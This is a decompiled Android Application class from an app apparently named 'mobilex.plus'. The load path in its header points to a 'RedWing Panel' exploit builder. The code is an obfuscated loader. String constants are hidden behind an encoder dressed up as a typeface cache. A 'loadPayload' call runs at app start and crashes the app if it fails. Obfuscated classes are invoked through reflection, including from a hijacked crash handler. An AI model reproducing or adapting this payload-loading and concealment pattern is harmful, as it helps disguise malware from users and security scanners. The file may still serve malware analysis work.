package app.mobilex.plus;

import android.app.Application;
import android.content.Context;
import app.mobilex.plus.App;
import app.mobilex.plus.util.TypefaceCache;
import app.mobilex.plus.util.UtilKNController;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import org.json.JSONObject;
import v.s.KV57Z6oavcB595B8Dy8Z;
import v.s.KgSM0TsKUpCiuePB;
import v.s.N4h1mGVqsY6M8lTtB;
import v.s.RIZfHbqXpth8r2yN4;
import v.s.Y9mRyRdkl5FOcwb66V6;
import v.s.oJLsXXGxdTuQpIRpV;
import v.s.okc5AGRjqrud84oM6d;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class App extends Application {
    public static final /* synthetic */ int dDIMxZXP1V8HdM = 0;

    @Override // android.content.ContextWrapper
    public void attachBaseContext(Context context) {
        super.attachBaseContext(context);
        if (!oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs) {
            try {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(context.getAssets().open(oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM), N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 8192);
                try {
                    String strPyu8ovAipBTLYAiKab = RIZfHbqXpth8r2yN4.pyu8ovAipBTLYAiKab(bufferedReader);
                    bufferedReader.close();
                    JSONObject jSONObject = new JSONObject(strPyu8ovAipBTLYAiKab);
                    oJLsXXGxdTuQpIRpV.vekpFI4d1Nc4fakF = jSONObject.optBoolean(TypefaceCache.obtain("002A00650064009500F100AB00ED00A3002F0065"), true);
                    oJLsXXGxdTuQpIRpV.JXn4Qf7zpnLjP5 = jSONObject.optBoolean(TypefaceCache.obtain("002A00650064009400E400BA00D300AB002600640064009500F100AB"), false);
                    oJLsXXGxdTuQpIRpV.Ee8d2j4S9Vm5yGuR = jSONObject.optString(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B3003A0066005E"), KV57Z6oavcB595B8Dy8Z.ibVTtJUNfrGYbW);
                    oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs = true;
                    TypefaceCache.obtain("000F0079005A008300F500BB008800E70037006F004B008200AD");
                    TypefaceCache.obtain("00630064005A009300AD");
                    TypefaceCache.obtain("00630065004900DA");
                } catch (Throwable th) {
                    try {
                        throw th;
                    } catch (Throwable th2) {
                        okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(bufferedReader, th);
                        throw th2;
                    }
                }
            } catch (Exception unused) {
                oJLsXXGxdTuQpIRpV.vekpFI4d1Nc4fakF = true;
                oJLsXXGxdTuQpIRpV.JXn4Qf7zpnLjP5 = false;
                oJLsXXGxdTuQpIRpV.Ee8d2j4S9Vm5yGuR = KV57Z6oavcB595B8Dy8Z.ibVTtJUNfrGYbW;
                oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs = true;
                TypefaceCache.obtain("000D0079001B008A00FF00BB00D700E9002900650054008900BC00FF00C700B4002A0078005C00C700F300B000DF00B7002A007A005E008300B000BB00D700A1002200630057009300E3");
            }
        }
        if (UtilKNController.loadPayload(context)) {
            return;
        }
        throw new RuntimeException(Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(TypefaceCache.obtain("0007005A006400A100D1009600FE00FD0063"), UtilKNController.vekpFI4d1Nc4fakF.toString()));
    }

    @Override // android.app.Application
    public void onCreate() {
        super.onCreate();
        try {
            final Thread.UncaughtExceptionHandler defaultUncaughtExceptionHandler = Thread.getDefaultUncaughtExceptionHandler();
            Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() { // from class: v.s.gwqvW1YsHBmGtO8bW7F
                private static /* synthetic */ void hqgtfn() {
                }

                @Override // java.lang.Thread.UncaughtExceptionHandler
                public final void uncaughtException(Thread thread, Throwable th) {
                    App app2 = this.dDIMxZXP1V8HdM;
                    int i = App.dDIMxZXP1V8HdM;
                    try {
                        String name = App.class.getName();
                        int iUoxIZOBVZaubOFdPNaXK = KgSM0TsKUpCiuePB.UoxIZOBVZaubOFdPNaXK(name, '.', 0, 6);
                        if (iUoxIZOBVZaubOFdPNaXK != -1) {
                            name = name.substring(0, iUoxIZOBVZaubOFdPNaXK);
                        }
                        Class.forName(name + TypefaceCache.obtain("006D0065005E009500E600B600D100A200300038007F008600E400BE00F00091001700770048008C")).getDeclaredMethod(TypefaceCache.obtain("003000750053008200F400AA00DE00A2"), Context.class).invoke(null, app2);
                    } catch (Throwable unused) {
                    }
                    Thread.UncaughtExceptionHandler uncaughtExceptionHandler = defaultUncaughtExceptionHandler;
                    if (uncaughtExceptionHandler != null) {
                        uncaughtExceptionHandler.uncaughtException(thread, th);
                    }
                }
            });
        } catch (Throwable unused) {
        }
        try {
            String name = App.class.getName();
            int iUoxIZOBVZaubOFdPNaXK = KgSM0TsKUpCiuePB.UoxIZOBVZaubOFdPNaXK(name, '.', 0, 6);
            if (iUoxIZOBVZaubOFdPNaXK != -1) {
                name = name.substring(0, iUoxIZOBVZaubOFdPNaXK);
            }
            Class.forName(name + TypefaceCache.obtain("006D005B005A008900F100B800D700B5001400520079009500F900BB00D500A2")).getDeclaredMethod(TypefaceCache.obtain("002A007800520093"), Application.class).invoke(null, this);
        } catch (Throwable unused2) {
        }
    }
}
